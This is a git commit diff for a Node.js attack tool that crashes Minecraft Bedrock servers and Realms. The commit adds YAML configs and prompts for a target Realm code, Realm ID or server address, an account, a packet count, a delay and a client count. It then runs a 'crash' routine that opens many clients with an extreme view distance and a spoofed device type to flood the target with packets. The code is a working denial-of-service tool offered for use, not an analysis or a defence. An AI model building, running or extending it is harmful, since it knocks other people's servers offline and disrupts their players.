eac2341b72094fbb0fdb6438341d294df0ebaab2
TrippleAWap <90356816+TrippleAWap@users.noreply.github.com>
2023-11-12 10:44:02 -0700

    Added Configs.

--- index.js
+++ index.js
@@ -1,9 +1,6 @@
-const protocol = require("bedrock-protocol");
-const { Authflow } = require('prismarine-auth');
-const { RealmAPI } = require("prismarine-realms");
+const protocol = require("bedrock-protocol"), { Authflow } = require('prismarine-auth'), { RealmAPI } = require("prismarine-realms"), fs = require("fs"), yaml = require("js-yaml");
 
-const onErrorCB = [];
-const onError = (callback) => onErrorCB.push(callback);
+const onErrorCB = [], onError = (callback) => onErrorCB.push(callback);
 
 const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -23,13 +20,19 @@ const runCommand = (client, command) => {
 const levelSoundEvent = (client, data) => {
     client.write('level_sound_event', data);
 };
-
+/** @type {Record<FileName: string, { PACKETS?: number, DELAY?: number, CLIENT_AMOUNT: 5, ACCOUNT?: any, TARGET?: { REALM_ID?: number, REALM_INVITE?: string, HOST?: string, PORT?: number, CLIENT_AMOUNT?: number }}>} */
+const configs = {}
+for (const file of fs.readdirSync('./configs')) {
+    const data = yaml.load(fs.readFileSync(`./configs/${file}`, 'utf8'));
+    configs[file.split('.').slice(0, -1)] = data;
+}
 const crash = async (options, count = 3) => {
+    options.skipPing = true;
     const delay = !!options.delay;
 
     const run = async (count = 3) => {
         console.log(`${new Date().toLocaleTimeString()} > Starting ${count} clients...`);
-        const client = new MultiClient(count);
+        const client = new MultiClient(count, options);
 
         async function disconnected(data = "None") {
             if (Date.now() - this.lastCall < 2000) return;
@@ -87,13 +90,86 @@ const crash = async (options, count = 3) => {
 
     run(count);
 };
-
+/** @type {ClientOptions} */
 const options = {
     "profilesFolder": "./profiles",
     "username": "MinecraftOMG",
     "skipPing": true,
-    "viewDistance": 32767
+    "viewDistance": 32767,
+    authTitle: "00000000441cc96b",
+    deviceType: "FortniteLevel3",
+    flow: "live",
 };
+const GETOPTION = {
+    "TARGET": async (options) => {
+        options.TARGET = {};
+        console.log(`Enter Target Type\n    1. Realm Code | 2. Server | 3. Realm ID`);
+        const input = await cin();
+        switch (input) {
+            case "1":
+                console.log(`Enter Realm Code`);
+                const invite = await cin();
+                options.TARGET.REALM_INVITE = invite;
+                break;
+            case "2":
+                console.log(`Enter Server IP`);
+                const ip = await cin();
+                options.TARGET.HOST = ip;
+                console.log(`Enter Server Port`);
+                const port = await cin();
+                options.TARGET.PORT = parseInt(port).toString()
+                break;
+            case "3":
+                console.log(`Enter Realm ID`);
+                const id = await cin();
+                options.TARGET.REALM_ID = parseInt(id);
+                break;
+            default:
+                console.log(`Invalid Input ${input} | Exiting...`);
+                await wait(5000);
+                process.exit(1);
+                return;
+        }
+        return options;
+    },
+    "ACCOUNT": async (options) => {
+        console.log(`Enter the account to use`);
+        options.ACCOUNT = await cin();
+        return options;
+    },
+    "DELAY": async (options) => {
+        console.log(`Enter the delay between packets`);
+        options.DELAY = parseInt(await cin());
+        return options;
+    },
+    "PACKETS": async (options) => {
+        console.log(`Enter the amount of packets to send`);
+        options.PACKETS = parseInt(await cin());
+        return options;
+    },
+    "CLIENT_AMOUNT": async (options) => {
+        console.log(`Enter the amount of clients to use`);
+        options.CLIENT_AMOUNT = parseInt(await cin());
+        return options;
+    }
+
+}
+
+const getRunConfig = async (data) => {
+    data ||= {}
+    const inputOptions = Object.keys(data)
+    const filteredOptions = ["TARGET", "ACCOUNT", "DELAY", "PACKETS", "CLIENT_AMOUNT"].filter(option => !inputOptions.includes(option))
+    for (const option of filteredOptions) {
+        await GETOPTION[option](data)
+    }
+    const r = { username: data.ACCOUNT, delay: data.DELAY, packets: data.PACKETS, amount: data.CLIENT_AMOUNT  }
+    if (data.TARGET.REALM_INVITE) r.realms = { realmInvite: data.TARGET.REALM_INVITE }
+    if (data.TARGET.REALM_ID) r.realms = { realmId: data.TARGET.REALM_ID }
+    if (data.TARGET.HOST) r.host = data.TARGET.HOST
+    if (data.TARGET.PORT) r.port = data.TARGET.PORT
+    return {...options, ...r}
+}
+
 
 process.on("uncaughtException", (e) => {
     for (const errorCB of onErrorCB) errorCB(e);
@@ -126,61 +202,35 @@ api.getRealms().then(async (d) => {
     });
 
     console.table(realmData);
-
-    console.log(`${new Date().toLocaleTimeString()} > Select A Target Type\n    1. Realm Code | 2. Server | 3. Realm ID`);
-
-    cin().then(async input => {
-        switch (input) {
-            case "1":
-                console.log(`Enter Realm Code`);
-                const invite = await cin();
-                (options.realms ??= {}).realmInvite = invite;
-                break;
-            case "2":
-                console.log(`Enter Server IP`);
-                const ip = await cin();
-                options.host = ip;
-                console.log(`Enter Server Port`);
-                const port = await cin();
-                options.port = parseInt(port);
-                break;
-            case "3":
-                console.log(`Enter Realm ID`);
-                const id = await cin();
-                (options.realms ??= {}).realmId = parseInt(id);
-                break;
-            default:
-                console.log(`Invalid Input ${input} | Exiting...`);
-                await wait(5000);
-                process.exit(1);
-                return;
+    const configData = Object.entries(configs).map(([name, data]) => {
+        data ||= {}
+        return {
+            Name: name,
+            PACKETS: data.PACKETS,
+            DELAY: data.DELAY,
+            CLIENT_AMOUNT: data.CLIENT_AMOUNT,
+            ACCOUNT: data.ACCOUNT,
+            TARGET: data.TARGET
         }
-
-        console.log(`Enter Delay (ms)`);
-        const delay = parseInt(await cin());
-        if (delay > 0) options.delay = delay;
-
-        console.log(`Enter Amount of Clients | < 1 will default to 1`);
-        const amount = parseInt(await cin());
-        options.amount = Math.max(1, amount);
-
-        console.log(`Enter Packets Per Join`);
-        const packets = parseInt(await cin());
-        options.packets = Math.max(0, packets);
-
-        crash(options, options.amount);
-    });
+    })
+    console.table(configData);
+    console.log(`Enter the config to use. ( eg. crash ) ( if config cannot be found, it will use no config )`);
+    const config = await cin();
+    getRunConfig(configs[config]).then((config) => {
+        console.log(`Starting...`, config);
+        crash(config);
+    })
 });
 
 const __o__emit = protocol.Client.prototype.emit;
 
-protocol.Client.prototype.emit = function (event, data) {
-    if (this.parentClass) this.parentClass.emit(event, this, data);
-    return __o__emit.call(this, event, data);
+protocol.Client.prototype.emit = function (event, ...data) {
+    if (this.parentClass) this.parentClass.emit(event, this, ...data);
+    return __o__emit.call(this, event, ...data);
 };
 
 class MultiClient {
-    constructor(amountOfClients) {
+    constructor(amountOfClients, options) {
         this.clients = [];
         this.events = {};
 
@@ -198,8 +248,8 @@ class MultiClient {
         createClients();
     }
 
-    emit(event, client, data) {
-        for (const cB of this.events[event] ?? []) cB(client, data);
+    emit(event, client, ...data) {
+        for (const cB of this.events[event] ?? []) cB(client, ...data);
     }
 
     on(event, callback) {
